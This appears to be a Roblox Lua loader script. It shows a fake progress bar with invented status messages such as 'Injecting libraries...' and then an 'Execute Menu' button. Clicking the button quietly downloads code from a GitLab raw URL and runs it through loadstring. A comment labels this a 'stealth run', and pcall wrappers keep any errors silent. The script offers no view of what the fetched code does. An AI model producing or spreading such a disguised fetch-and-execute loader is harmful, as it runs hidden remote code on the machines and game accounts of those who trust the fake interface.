-- Status messages
local statuses = {
    "Setting up menu...",
    "Downloading assets...",
    "Injecting libraries...",
    "Preparing environment...",
    "Finalizing..."
}

-- Loading animation
local duration = 20
local startTime = tick()

local statusIndex = 1
local nextStatusChange = tick() + (duration / #statuses)

RS.RenderStepped:Connect(function()
    local elapsed = tick() - startTime
    local progress = math.clamp(elapsed / duration, 0, 1)

    fill.Size = UDim2.new(progress, 0, 1, 0)
    percentLabel.Text = math.floor(progress * 100) .. "%"

    if tick() >= nextStatusChange and statusIndex < #statuses then
        statusIndex += 1
        statusLabel.Text = statuses[statusIndex]
        nextStatusChange = tick() + (duration / #statuses)
    end
end)

-- End of loading
task.delay(duration, function()
    -- Fade out loading elements
    for _, obj in ipairs({fill, percentLabel, statusLabel, reminder, barContainer}) do
        if obj:IsA("TextLabel") then
            obj:TweenPosition(obj.Position + UDim2.new(0,0,-0.05,0), "Out", "Quad", 0.5, true)
            obj:TweenTransparency(1, "Out", "Quad", 0.5, true)
        else
            obj:TweenSize(UDim2.new(0,0,0,0), "Out", "Quad", 0.5, true)
            obj:TweenSizeAndPosition(UDim2.new(0,0,0,0), obj.Position, "Out", "Quad", 0.5, true)
        end
    end

    -- Show Execute button
    task.delay(0.6, function()
        local execBtn = Instance.new("TextButton")
        execBtn.AnchorPoint = Vector2.new(0.5, 0.5)
        execBtn.Position = UDim2.new(0.5, 0, 0.7, 0)
        execBtn.Size = UDim2.new(0.25, 0, 0.08, 0)
        execBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 170)
        execBtn.Text = "Execute Menu"
        execBtn.Font = Enum.Font.GothamBold
        execBtn.TextScaled = true
        execBtn.TextColor3 = Color3.fromRGB(0, 0, 0)

        local stroke = Instance.new("UIStroke")
        stroke.Color = Color3.fromRGB(255, 255, 255)
        stroke.Thickness = 2
        stroke.Parent = execBtn

        execBtn.Parent = bg

        -- Hover animation
        execBtn.MouseEnter:Connect(function()
            execBtn:TweenSize(UDim2.new(0.27, 0, 0.09, 0), "Out", "Quad", 0.2, true)
        end)
        execBtn.MouseLeave:Connect(function()
            execBtn:TweenSize(UDim2.new(0.25, 0, 0.08, 0), "Out", "Quad", 0.2, true)
        end)

        execBtn.MouseButton1Click:Connect(function()
            execBtn:TweenSize(UDim2.new(0.2, 0, 0.06, 0), "Out", "Back", 0.2, true)
            execBtn.TextTransparency = 1
            task.wait(0.2)
            bg:Destroy()

            -- ✅ Stealth run Spawner script
            task.spawn(function()
                local success, code = pcall(function()
                    return game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua")
                end)
                if success and code then
                    local env = setmetatable({}, { __index = function(_, k)
                        return rawget(getfenv(), k) or getfenv()[k]
                    end })
                    local fn = loadstring(code)
                    if fn then
                        setfenv(fn, env)
                        pcall(fn)
                        if env.Spawner and env.Spawner.Load then
                            pcall(function() env.Spawner.Load() end)
                        end
                    end
                end
                success, code, fn = nil, nil, nil
            end)
        end)
    end)
end)
